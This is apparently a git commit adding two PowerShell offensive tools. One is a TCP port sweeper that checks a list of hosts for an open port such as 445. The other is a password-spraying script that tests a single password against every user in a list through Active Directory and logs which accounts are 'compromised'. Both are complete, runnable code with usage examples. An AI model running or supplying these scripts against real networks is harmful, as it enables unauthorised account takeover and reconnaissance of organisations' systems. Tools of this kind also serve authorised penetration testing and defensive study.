8fc8c962269a2166dd1de6751c8ae24142382768
InfosecMatter <60963123+InfosecMatter@users.noreply.github.com>
2020-03-05 23:04:32 +0400

    Add files via upload

---
+++ portsweep.ps1
@@ -0,0 +1,32 @@
+Function portsweep {
+  param($list,$port) 
+
+  if (!$port) {
+    Write-Host "usage: portsweep <list.txt> <port>"
+	Write-Host " e.g.: portsweep ips.txt 445`n"
+	return
+  }
+  $results = ".\portsweep.$port.txt"
+   
+  foreach($line in Get-Content $list) {
+    $x = (gc $results -EA SilentlyContinue | select-string "^$line,$port,")
+    if ($x) {
+	  gc $results | select-string "^$line,$port,"
+      continue
+    }
+    $output = "$line,$port,"
+   
+    $c = new-object system.net.sockets.tcpclient
+    $c.SendTimeout = 500
+    try {
+      $c.Connect($line,$port)
+    } catch {}
+    if ($c.Connected) {
+      $output += "True"
+    } else {
+      $output += "False"
+    }
+    Write-Host "$output"
+    echo $output >>$results
+  }
+}
---
+++ smblogin.ps1
@@ -0,0 +1,32 @@
+Function adcheck {
+  param($u,$p)
+  (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
+}
+ 
+Function smblogin {
+  param($userlist,$domain,$pwd)
+
+  if (!$pwd) {
+    Write-Host "usage: smblogin <userlist.txt> <domain> <password>"
+	Write-Host " e.g.: smblogin users.txt domain.com P@ssw0rd`n"
+	return
+  }
+  $results = ".\smblogin.$pwd.txt"
+
+  foreach($line in Get-Content $userlist) {
+    $x = (gc $results -EA SilentlyContinue | select-string "^$line,.*,True$")
+    if ($x) {
+      Write-Host "user $line already compromised"
+      continue
+    }
+    $x = (gc $results | select-string -CaseSensitive "^$line,$pwd,")
+    if ($x) {
+      Write-Host "user $line with $pwd already tried"
+      continue
+    }
+    $output = "$line,$pwd,"
+    $output += adcheck "$domain\$line" "$pwd"
+    Write-Host "$output"
+    echo $output >>$results
+  }
+}
